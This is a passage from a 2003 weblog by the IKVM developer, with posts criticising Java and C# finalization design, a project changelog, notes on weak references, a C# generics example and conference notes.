            Fix the <a href="http://msdn.microsoft.com/library/default.asp?url=/library/en-us/cpgenref/html/cpconfinalizedispose.asp">guidelines</a>.
            Managed and unmanaged cleanup are two very different things and should not be mixed.
            Also, add a rule not to call any virtual methods from a Finalize method. 
        </li>
        <li>
            Make overriding Object.Finalize require full trust. There is no need for a finalizer
            unless you are wrapping an unmanaged resource and only fully trusted code can do that. 
        </li>
        <li>
            Change&#160;the C# compiler to make the Finalize method generated for the destructor
            sealed by default. 
        </li>
    </ul>
    <p>
        These are all compatibility breaking changes, so they are probably not going to happen.
        Resource leaks and denial of service attacks are not on the agenda for the mainstream
        CLR. It's interesting to note that Yukon apparantly prohibits untrusted code from
        overriding the Finalize method, I wonder how they'll deal with the dispose pattern. 
    </p>
</body>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		11/23/2003 15:48:06 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=4d74e2d2-f0b8-4838-912f-9cfb42d970b0"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=4d74e2d2-f0b8-4838-912f-9cfb42d970b0">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Monday, 17 November 2003</h2></div>
<div class="newsItems"><a name="aec330149-7da0-473a-b693-1c51eb03496a"></a><div class="entry">
	<h3 class="entryTitle">C# Destructor Considered Harmful</h3>
	<div class="entryBody">
		<body xmlns="http://www.w3.org/1999/xhtml">
    <p>
        After last week's Java finalization <a href="http://weblog.ikvm.net/permalink.aspx/3e0abc11-f486-4366-9127-cf38bb6c3ef1">bashing</a>,
        it turns out that C# is even more broken. 
    </p>
    <p>
    </p>
    <strong>A&#160;C# Destructor Cannot Be Sealed</strong> 
    <p>
    </p>
    <p>
        This is&#160;really bad! If you recall my example of a proper class that uses finalization
        correctly, you might remember that the class was final. I still&#160; highly recommend
        this, but in some scenarios it might be preferable to allow others to extend your
        class. In such cases it is <strong>highly </strong>recommended that you make your
        finalize method final. Otherwise the subclasser might override finalize and forget
        to call your finalize method. 
    </p>
    <p>
        If you wrap an unmanaged resource and your class is non-final and it is exposed to
        untrusted code, you <strong>must </strong>make your finalize method final. 
    </p>
    <p>
        If you don't, the untrusted code can (intentionally or not) create a subclass of your
        class, override finalize (not call super.finalize()) and start leaking unmanaged resources
        that will <strong>never </strong>be cleaned up as long as the JVM is running. 
    </p>
    <p>
        <strong>Back To C#</strong> 
    </p>
    <p>
        To see why the C# design is a problem, we only need to look at System.WeakReference.
        It is a public non-sealed&#160;class that wraps an unmanaged resource (a GCHandle),
        the destructor is obviously not sealed and it does not require any privileges to use,
        this equals a recipe for disaster. Untrusted code can leak GCHandles that will never
        be reclaimed as long as the CLR is running [1]. Not even when the AppDomain is unloaded! 
    </p>
    <p>
        IMO, the destructor syntax should be deprecated and Finalize should be treated like
        any other method. This current design is&#160;hardly a <a href="http://blogs.gotdotnet.com/BradA/permalink.aspx/b7a0cf5c-a283-4f95-a508-819102d2feae">pit
        of success</a>. 
    </p>
    <p>
        [1]&#160;While the C# destructor is nice enough to always call the base class Finalize
        method, other languages (e.g. ILASM or VB.NET) don't require this. 
    </p>
</body>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		11/17/2003 14:19:49 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=ec330149-7da0-473a-b693-1c51eb03496a"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=ec330149-7da0-473a-b693-1c51eb03496a">Comments [10]</a>
		
		<br clear="all">
	</div>
</div><a name="a129450ad-d2e8-4770-9d6d-b6d732316949"></a><div class="entry">
	<h3 class="entryTitle">New Snapshot</h3>
	<div class="entryBody">
		<body xmlns="http://www.w3.org/1999/xhtml">
    <p>
        As usual it took a mighty long time, but I finally managed to check in my changes
        and create a new snapshot. 
    </p>
    <p>
        Here is what's new: 
    </p>
    <ul>
        <li>
            Support for @deprecated attribute in <em>ikvmc</em>. Compiled as System.ObsoleteAttribute
            (IsError = false). 
        </li>
        <li>
            Support for declared exceptions. Reflection (Method.getExceptionTypes) will now return
            all declared exceptions that the method throws. C# (or VB.NET or whatever) code can
            use the OpenSystem.Java.ThrowsAttribute attribute to declare exceptions. 
        </li>
        <li>
            Changed value type handling to treat null reference as default instance when unboxing
            (instead of throwing an unexpected NullPointerException). Added (experimental)&#160;support
            for customized boxing in map.xml. 
        </li>
        <li>
            Remapped types can now have constant&#160;(non-blank static final) fields. 
        </li>
        <li>
            java.lang.String and java.lang.Throwable now have the correct serialVersionUID. 
        </li>
        <li>
            Fixed a bug (introduced with the ghost interfaces change) that caused virtual call
            to Object.clone() to fail with a CloneNotSupportedException. 
        </li>
        <li>
            Changed static initializer support to use a special field (__&lt;clinit&gt;) in the
            base class to trigger the base class static initializer to run (instead of using RuntimeHelpers.RunClassConstructor).
            This should make static initialization a little faster. 
        </li>
        <li>
            Changed "managed JNI" method lookup to support overloading. 
        </li>
        <li>
            Made all introduced methods in ghost wrappers HideFromReflection. 
        </li>
        <li>
            Re-enabled the warning for missing native methods on static compilation. 
        </li>
        <li>
            Fixed reflection on .NET types to hide static methods on interfaces (Java doesn't
            allow them). 
        </li>
        <li>
            Added dummy "native" methods for unused methods in java.lang.reflect.Proxy (to avoid
            warnings from <em>ikvmc </em>when compiling classpath.dll). 
        </li>
        <li>
            Fixed InetAddress.getLocalHostname() method name typo. 
        </li>
        <li>
            Added skeleton implementation of "native" methods for java.nio.channels.FileChannelImpl. 
        </li>
        <li>
            Changed DupHelper in compiler to support "unitialized this" references. 
        </li>
        <li>
            Changed compiler to emit ldc_i4_0 / conv_i8 instead of ldc_8 0 and various similar
            (small) optimizations. 
        </li>
        <li>
            Added support for&#160;declaring exceptions on&#160;methods of remapped types&#160;and
            added appropriate declaration to map.xml. 
        </li>
        <li>
            Added experimental remapping of gnu.classpath.RawData to System.IntPtr and custom
            boxing operator for gnu.classpath.RawData to box IntPtr.Zero to a null reference. 
        </li>
        <li>
            Added support for <em>ldnull</em> and&#160;<em>box </em>opcodes to remapping instruction
            set. 
        </li>
        <li>
            Added optional <em>constant </em>attribute to <em>field</em> element of remapping
            xml. 
        </li>
        <li>
            Added ikvm\classpath\java\lang\ref\Reference.java (copied from GNU Classpath and modified
            to implement (most of) the required functionality). 
        </li>
        <li>
            Added exclusion list to compilation of classpath.dll to remove unused classes (VMObject,
            VMString and VMThrowable). 
        </li>
        <li>
            Fixed&#160;<em>netexp </em>to create classes for non-public base classes. 
        </li>
        <li>
            Fixed <em>netexp </em>to&#160;export the interfaces a class implements. 
        </li>
        <li>
            Fixed <em>netexp</em> to export declared exceptions. 
        </li>
        <li>
            Some refactoring and a few small other changes. 
        </li>
    </ul>
    <p>
        I used Stuart's excellent <a href="http://japi.sab39.org/">japitools</a> to test the
        remapping, reflection and round-tripping and found a lot of bugs this way. I ran <a href="http://japi.sab39.org/#japize">japize</a> on
        a&#160; classpath.jar generated by <em>netexp </em>from classpath.dll. This way, the
        whole tool chain is tested (ikvmc -&gt; reflection -&gt; netexp). 
    </p>
    <p>
        Note that @deprecated doesn't round-trip, because Java reflection doesn't expose the
        fact that something is deprecated. 
    </p>
    <p>
        The full patch is <a href="http://www.frijters.net/20031117.diff">here</a> (excluding
        the new files, Reference.java and exclude.lst). 
    </p>
    <p>
        Updated <a href="http://www.frijters.net/ikvmbin.zip">binary</a>&#160;and <a href="http://www.frijters.net/ikvm.zip">source</a> snapshots
        are available. 
    </p>
</body>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		11/17/2003 13:04:39 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=129450ad-d2e8-4770-9d6d-b6d732316949"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=129450ad-d2e8-4770-9d6d-b6d732316949">Comments [2]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Saturday, 15 November 2003</h2></div>
<div class="newsItems"><a name="aa67cf7f8-391d-4450-b44d-c4b2cba35103"></a><div class="entry">
	<h3 class="entryTitle">Weak References</h3>
	<div class="entryBody">
		<body xmlns="http://www.w3.org/1999/xhtml">
    <p>
        I finally implemented (partial) support for weak references. Java has three types
        of&#160;weak references: 
    </p>
    <ul>
        <li>
            <a href="http://java.sun.com/j2se/1.4.1/docs/api/java/lang/ref/SoftReference.html">SoftReference </a> 
        </li>
        <li>
            <a href="http://java.sun.com/j2se/1.4.1/docs/api/java/lang/ref/WeakReference.html">WeakReference </a> 
        </li>
        <li>
            <a href="http://java.sun.com/j2se/1.4.1/docs/api/java/lang/ref/PhantomReference.html">PhantomReference </a>
        </li>
    </ul>
    <p>
        Only WeakReference is implemented 100% correctly (barring any bugs), but I'm pretty
        sure that&#160;the difference between the IKVM and JVM implementations of PhantomReference&#160;is
        undetectable. SoftReference is currently implemented as a WeakReference, this means
        that they will be cleared too soon and this could adversly affect performance of caches
        that depend on SoftReference. 
    </p>
    <p>
        <strong>ReferenceQueue</strong> 
    </p>
    <p>
        <a href="http://java.sun.com/j2se/1.4.1/docs/api/java/lang/ref/ReferenceQueue.html">ReferenceQueue</a>&#160;is
        fully supported, but it isn't very efficient. Every <a href="http://java.sun.com/j2se/1.4.1/docs/api/java/lang/ref/Reference.html">Reference</a> instance
        that is associated with a queue has a corresponding object that watches for GC activity
        (by having a finalize method and being unreachable), each time the finalizer runs
        it checks the associated Reference to see if it has been cleared, if it has the Reference
        is inserted into the ReferenceQueue, if it hasn't, a new watcher object instance is
        created. 
    </p>
    <p>
        <strong>PhantomReference</strong> 
    </p>
    <p>
        The difference between the IKVM and JVM PhantomReference is that the IKVM implementation
        doesn't actually prevent the object from being collected, but since you cannot possibly
        get a reference to a phantom reachable object (apart from using non-portable reflection
        hacks), I don't understand the point of the specified behavior for PhantomReference. 
    </p>
    <p>
        <strong>Source</strong> 
    </p>
    <p>
        Source is not yet in CVS. I made many other changes as well and I'll try to check
        them in and create a new snapshot tomorrow. 
    </p>
</body>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		11/15/2003 22:03:33 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=a67cf7f8-391d-4450-b44d-c4b2cba35103"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=a67cf7f8-391d-4450-b44d-c4b2cba35103">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Friday, 14 November 2003</h2></div>
<div class="newsItems"><a name="a94eed5a8-6c9c-4d1d-a001-321344a2d2f6"></a><div class="entry">
	<h3 class="entryTitle">Generic Algorithms</h3>
	<div class="entryBody">
		<body xmlns="http://www.w3.org/1999/xhtml">
    <p>
        Anders Hejlsberg came up with a <a href="http://blogs.gotdotnet.com/EricGu/permalink.aspx/0efca2aa-0c7c-4aa0-a54c-ec8ad7e03ff9">clever
        trick</a> to implement generic algorithms with the current C# generics implementation. 
    </p>
    <p>
        According to&#160;the C# Version 2.0&#160;Language&#160;Specification, interface method
        invocations on value types (uses a generics parameters) will not cause the value to
        be boxed. This gave me the idea to use a value type for the calculator to avoid the
        virtual function dispatch. 
    </p>
    <p>
        <font face="Courier New" color="#0000ff" size="2">using </font><b><font face="Courier New" color="#000080" size="2">System</font></b><font face="Courier New" size="2">;<br />
        </font><font face="Courier New" color="#0000ff" size="2">using </font><b><font face="Courier New" color="#000080" size="2">System</font></b><font face="Courier New" size="2">.</font><b><font face="Courier New" color="#000080" size="2">Collections</font></b><font face="Courier New" size="2">.</font><b><font face="Courier New" color="#000080" size="2">Generic</font></b><font face="Courier New" size="2">;<br />
        <br />
        </font><font face="Courier New" color="#0000ff" size="2">interface </font><b><font face="Courier New" color="#000080" size="2">ICalculator</font></b><font face="Courier New" size="2">&lt;T&gt;<br />
        {<br />
        &#160;&#160;T Add(T t1, T t2);<br />
        }<br />
        <br />
        </font><font face="Courier New" color="#0000ff" size="2">struct </font><b><font face="Courier New" color="#000080" size="2">IntCalculator </font></b><font face="Courier New" size="2">: </font><b><font face="Courier New" color="#000080" size="2">ICalculator</font></b><font face="Courier New" size="2">&lt;</font><font face="Courier New" color="#0000ff" size="2">int</font><font face="Courier New" size="2">&gt;<br />
        {<br />
        &#160; </font><font face="Courier New" color="#0000ff" size="2">public </font><font face="Courier New" color="#0000ff" size="2">int</font><font face="Courier New" size="2"> Add(</font><font face="Courier New" color="#0000ff" size="2">int</font><font face="Courier New" size="2"> t1, </font><font face="Courier New" color="#0000ff" size="2">int</font><font face="Courier New" size="2"> t2)<br />
        &#160; {<br />
        &#160;&#160;&#160; </font><font face="Courier New" color="#0000ff" size="2">return</font><font face="Courier New" size="2"> t1
        + t2;<br />
        &#160; }<br />
        }<br />
        <br />
        </font><font face="Courier New" color="#0000ff" size="2">class </font><b><font face="Courier New" color="#000080" size="2">AlgorithmLibrary</font></b><font face="Courier New" size="2">&lt;C,
        T&gt;<br />
        </font><font face="Courier New" color="#0000ff" size="2">where</font><font face="Courier New" size="2"> C
        : </font><b><font face="Courier New" color="#000080" size="2">ICalculator</font></b><font face="Courier New" size="2">&lt;T&gt;<br />
        {<br />
        &#160; </font><font face="Courier New" color="#0000ff" size="2">static</font><font face="Courier New" size="2"> C
        calculator = C.</font><font face="Courier New" color="#0000ff" size="2">default</font><font face="Courier New" size="2">;</font> 
    </p>
    <p>
        <font face="Courier New" color="#0000ff" size="2">&#160; public </font><font face="Courier New" color="#0000ff" size="2">static</font><font face="Courier New" size="2"> T
        Sum(</font><b><font face="Courier New" color="#000080" size="2">List</font></b><font face="Courier New" size="2">&lt;T&gt;
        items)<br />
        &#160; {<br />
        &#160;&#160;&#160; T sum = T.</font><font face="Courier New" color="#0000ff" size="2">default</font><font face="Courier New" size="2">;<br />
        &#160;&#160;&#160; </font><font face="Courier New" color="#0000ff" size="2">for</font><font face="Courier New" size="2">(</font><font face="Courier New" color="#0000ff" size="2">int</font><font face="Courier New" size="2"> i
        = 0; i &lt; items.Count; i++)<br />
        &#160;&#160;&#160; </font><font face="Courier New" size="2">{<br />
        &#160;&#160;&#160;&#160;&#160; sum = calculator.Add(sum, items[i]);<br />
        &#160;&#160;&#160; }<br />
        &#160;&#160;&#160; </font><font face="Courier New" color="#0000ff" size="2">return</font><font face="Courier New" size="2"> sum;<br />
        &#160; }<br />
        } </font>
    </p>
    <p>
        <font face="Courier New" color="#0000ff" size="2">public </font><font face="Courier New" color="#0000ff" size="2">class </font><b><font face="Courier New" color="#000080" size="2">Class4<br />
        </font></b><font face="Courier New" size="2">{<br />
        &#160; </font><font face="Courier New" color="#0000ff" size="2">static </font><font face="Courier New" color="#0000ff" size="2">void</font><font face="Courier New" size="2"> Main()<br />
        &#160; {<br />
        &#160;&#160;&#160; </font><b><font face="Courier New" color="#000080" size="2">List</font></b><font face="Courier New" size="2">&lt;</font><font face="Courier New" color="#0000ff" size="2">int</font><font face="Courier New" size="2">&gt;
        foo = </font><font face="Courier New" color="#0000ff" size="2">new </font><b><font face="Courier New" color="#000080" size="2">List </font></b><font face="Courier New" size="2">&lt;</font><font face="Courier New" color="#0000ff" size="2">int</font><font face="Courier New" size="2">&gt;();<br />
        &#160;&#160;&#160; foo.Add(1);<br />
        &#160;&#160;&#160; foo.Add(2);<br />
        &#160;&#160;&#160; foo.Add(3);<br />
        <br />
        &#160;&#160;&#160; <font color="#0000ff">int </font>sum = <strong><font color="#000080">AlgorithmLibrary</font></strong><font face="Courier New" size="2">&lt;</font><b><font face="Courier New" color="#000080" size="2">IntCalculator</font></b></font><font face="Courier New" size="2">, </font><font face="Courier New" color="#0000ff" size="2">int</font><font face="Courier New" size="2">&gt;.Sum(foo);<br />
        &#160;&#160;&#160;&#160;</font><b><font face="Courier New" color="#000080" size="2">Console</font></b><font face="Courier New" size="2">.WriteLine(sum</font><font face="Courier New" size="2">);<br />
        &#160; }<br />
        }</font> 
    </p>
    <p>
        Depending on how the JIT decides to compile this, this could be very efficient (the
        JIT could decide to generate specialized x86 code for every type that Sum() is used
        on). 
    </p>
</body>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		11/14/2003 11:53:43 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=94eed5a8-6c9c-4d1d-a001-321344a2d2f6"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=94eed5a8-6c9c-4d1d-a001-321344a2d2f6">Comments [3]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Sunday, 09 November 2003</h2></div>
<div class="newsItems"><a name="a3e0abc11-f486-4366-9127-cf38bb6c3ef1"></a><div class="entry">
	<h3 class="entryTitle">Finalize Considered Harmful</h3>
	<div class="entryBody">
		<body xmlns="http://www.w3.org/1999/xhtml">
    <p>
        Last week at the PDC I talked to Anders Hejlsberg (btw, he's a really nice person).
        I asked him about having a way to prevent boxing and he told me they had already considered
        it and found too many problems with it (reflection, generics, more on that in another
        post). I also told him that I felt that C# had only one design flaw: The destructor
        syntax. I was reminded of this when I was working on some java.nio classes yesterday. 
    </p>
    <p>
        <strong>The Java Community Doesn't Understand Finalization</strong> 
    </p>
    <p>
        How's that for a section title? It's obviously a generalization, but I don't think
        it is too far from the truth. To prepare for writing this entry I looked at finalization
        in three books: 
    </p>
    <ul>
        <li>
            <a href="http://www.awprofessional.com/catalog/product.asp?product_id=%7b315F526F-C338-4227-A356-1DB485DA74B4%7d">Practical
            Java</a>, Peter Haggar 
        </li>
        <li>
            <a href="http://java.sun.com/docs/books/jls/second_edition/html/j.title.doc.html">Java
            Language Specification</a>, James Gosling and friends 
        </li>
        <li>
            <a href="http://www.wileyeurope.com/WileyCDA/WileyTitle/productCd-0471941484.html">Garbage
            Collection</a>, Richard Jones and Rafael Lins 
        </li>
    </ul>
    <p>
        All three are excellent books. Highly recommended. 
    </p>
    <p>
        Addison-Wesley put online the relevant section of Peter's book <a href="http://www.awprofessional.com/catalog/article.asp?product_id=%7b578C9014-0CDA-4C72-B79B-997C44AC234A%7d">here</a>.
        First, let me say that Peter is a very smart guy (I know him from the <a href="http://www.softwaresummit.com/">Colorado
        Software Summit</a>) and that this doesn't reflect on the quality of the rest of the
        book, but I'm picking on him because part of this particular "praxis" demonstrates
        the, IMO, typical misunderstanding of finalization in the Java community (and because
        his book is one of the few Java books I own). 
    </p>
    <p>
        So, what is wrong with his code? He uses the finalize method to cleanup <em>managed
        objects that already have their own finalizer!</em> 
        <br />
        This practice is widely used in the Java libraries as well and it is a really bad
        idea. At best it doesn't help (the ServerSocket and FileInputStream will have already
        been finalized (see JLS <a href="http://java.sun.com/docs/books/jls/second_edition/html/execution.doc.html#44837">12.6.2
        Finalizer Invocations are Not Ordered</a>), or will be finalized soon anyway) and
        at worst you create APIs that are very difficult to use (or code) because multiple
        objects "own" the same resource. 
    </p>
    <p>
        The JLS doesn't say anything useful about <a href="http://java.sun.com/docs/books/jls/second_edition/html/execution.doc.html#44748">finalization</a>,
        but does mention that you should always call super.finalize() in your finalizer (like
        Peter does in his code). 
    </p>
    <p>
        THIS IS USELESS! 
    </p>
    <p>
        Why? All finalizable classes should extend java.lang.Object and be final, because
        there is no reason for them not to be. Here is what a finalizable class should look
        like. 
    </p>
    <pre>final class FileHandle {
  private int nativeHandle;

  FileHandle(String filename) {
    nativeHandle = nativeOpen(filename);
  }
  private static int nativeOpen(String filename);

  synchronized void close() {
    if(nativeHandle != 0) {
      nativeClose(nativeHandle);
      nativeHandle = 0;
    }
  }
  private static native void nativeClose(int handle);
  
  protected void finalize() {
    close();
  }

  // example operation, the others are omitted
  synchronized int read(...) {
    return nativeRead(nativeHandle, ...);
  }
  private static native int nativeRead(int handle, ...);
} </pre>
    <p>
        Other than exposing the primitive operations that can be performed on the unmanaged
        resource (thru the handle), the class should have no functionality. The class is package
        private and used only by the public classes that actually implement the exposed API.
        The class should never have any references to other objects. 
    </p>
    <p>
        This pattern of factoring out the finalizable resource into a separate class is discussed
        in the Jones/Lins book. It seems that not enough people read it. 
    </p>
    <p>
        The above discussion is specific to Java and .NET finalization, there are other implementations
        of finalization that do finalize in order. In such an implementation it can actually
        be useful to use references to other objects in your finalize method, because you
        know that the object you're using hasn't already been finalized. 
    </p>
    <p>
        <strong>Back To C#</strong> 
    </p>
    <p>
        So what's wrong with the C# destructor syntax? I think it encourages the mistake of
        thinking of Finalize as a destructor (and thus using it to cleanup other managed objects).
        Also, a "feature" of the C# destructor is that it always call the base class Finalize
        method. I hope I've shown that this isn't very useful. 
    </p>
    <p>
        Anders agreed with me. "In retrospect we probably shouldn't have done that." (paraphrased
        from memory).<br />
    </p>
</body>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		11/09/2003 15:53:01 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=3e0abc11-f486-4366-9127-cf38bb6c3ef1"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=3e0abc11-f486-4366-9127-cf38bb6c3ef1">Comments [1]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Wednesday, 29 October 2003</h2></div>
<div class="newsItems"><a name="a4961b850-1da4-4511-bde6-95d90d4c3705"></a><div class="entry">
	<h3 class="entryTitle">More Name Dropping</h3>
	<div class="entryBody">
		<body xmlns="http://www.w3.org/1999/xhtml">
    I finally met Miguel de Icaza at the Unofficial Mono BoF and he gave me a cool Mono
    T-shirt (Thanks Miguel!). I talked about IKVM with Chris Brumme and discussed reflection
    with Peter Drayton and Dario Russi. I asked Eric Gunnerson about a custom attribute
    to prevent boxing, but from his response I take it that it is unlikely that'll ever
    happen. I met Chris Hollander at the "alternate programming languages BoF" last night
    (at 11pm, ugh). He told me he got a lot of referrers from my site. Since his blog
    is named "Objective", this makes me wonder if people are looking for information on
    the objectives of IKVM. I really should write some more documentation ;-)</body>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		10/29/2003 20:59:44 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=4961b850-1da4-4511-bde6-95d90d4c3705"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=4961b850-1da4-4511-bde6-95d90d4c3705">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Tuesday, 28 October 2003</h2></div>
<div class="newsItems"><a name="a682e6232-a9e8-47c6-b6d0-60173be6230c"></a><div class="entry">
	<h3 class="entryTitle">Whidbey</h3>
	<div class="entryBody">
		<body xmlns="http://www.w3.org/1999/xhtml">
    <p>
        Whidbey was unveiled this morning. It has lots of nice new features, but I'm particularly
        interested in some of the&#160;improvements&#160;to reflection.
    </p>
    <ul>
        <li>
            Finally, there is support for custom modifiers in Reflection.Emit</li>
        <li>
            DynamicMethod allows methods to be generated that "implement" a delegate and the code
            gets garbage collected along with the delegate when it is no longer reachable.</li>
        <li>
            There is (some) support for doing more of Reflection.Emit based on tokens (a token
            is an Int32 that refers to metadata in a module), instead of the more heavy weight
            MethodInfo/FieldInfo/etc. objects.</li>
        <li>
            Reflection objects (e.g. MethodInfo) are now kept in a weak reference cache, so that
            they can be garbage collected if they aren't needed anymore.</li>
    </ul>
    <p>
        I need to do some rewriting to take advantage of the last two, but once I do, the
        memory usage of IKVM should (hopefully) go down significantly. I'm not entirely sure
        that the changes they made are powerful enough, but it is an important step in the
        right direction.
    </p>
    <p>
        I know I promised I wasn't going to move to Whidbey anytime soon, but I am going to
        introduce some conditional compilation for Whidbey specific features, so that I can
        play around with them. Mainstream development will continue to be on 1.1
    </p>
</body>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		10/28/2003 21:23:21 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=682e6232-a9e8-47c6-b6d0-60173be6230c"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=682e6232-a9e8-47c6-b6d0-60173be6230c">Comments [4]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Monday, 27 October 2003</h2></div>
<div class="newsItems"><a name="a7c1e0934-cc02-4866-8c48-b887f86b4ad7"></a><div class="entry">
	<h3 class="entryTitle">Eclipse Reception</h3>
	<div class="entryBody">
		<body xmlns="http://www.w3.org/1999/xhtml">
    <p>
        Last night I visisted the Eclipse reception at OOPSLA 2003. Chris Laffra from IBM
        Canada had prepared a poster on Alternative Eclipse Execution Models and he included
        IKVM on it. He also invited me to the Eclipse Reception. There was a fair amount of
        interest in IKVM and I talked to a bunch of people, including Erich Gamma and Doug
        Lea. That was cool.
    </p>
    <p>
        This morning I atttended the PDC keynote by Bill Gates and Jim Allchin. See the other
        PDC blogs for details ;-)
    </p>
    <p>
        If you're at the PDC, I'm wearing a red/white/blue (vertical bars, as in the Dutch
        flag) polo shirt with a small Java logo in the front. If you see me, say hi.
    </p>
</body>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		10/27/2003 21:15:03 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=7c1e0934-cc02-4866-8c48-b887f86b4ad7"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=7c1e0934-cc02-4866-8c48-b887f86b4ad7">Comments [4]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Sunday, 26 October 2003</h2></div>
<div class="newsItems"><a name="ac60c3e3c-d0e8-4fab-a7ce-eeb1298821a5"></a><div class="entry">
	<h3 class="entryTitle">PDC</h3>
	<div class="entryBody">
		<body xmlns="http://www.w3.org/1999/xhtml">
    <p>
        I arrived in LA last Friday. No internet access in the hotel room, but fortunately
        the conference center has excellent connectivity.
    </p>
    <p>
        I'm not going to be <a href="http://pdcbloggers.net/">PDC blogging</a>, but expect
        more non-technical entries this week than usual.
    </p>
    <p>
        Tonight I'm going to the <a href="http://oopsla.acm.org/oopsla2003/files/spc-1.html">Eclipse
        reception</a> at <a href="http://oopsla.acm.org/oopsla2003/files/">OOPSLA 2003</a>.
        It'll be fun to chat with some of the Eclipse developers. May be I can get them to
        fix their class loading ;-)
    </p>
</body>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		10/26/2003 18:07:35 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=c60c3e3c-d0e8-4fab-a7ce-eeb1298821a5"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=c60c3e3c-d0e8-4fab-a7ce-eeb1298821a5">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Wednesday, 22 October 2003</h2></div>
<div class="newsItems"><a name="ae4030347-e4db-4caa-8b2e-81d31197fef3"></a><div class="entry">
	<h3 class="entryTitle">Private Super Classes</h3>
	<div class="entryBody">
		<body xmlns="http://www.w3.org/1999/xhtml">
    <p>
        While trying to get Stuart Ballard's <a href="http://japi.sab39.org/">Japitools</a>&#160;to
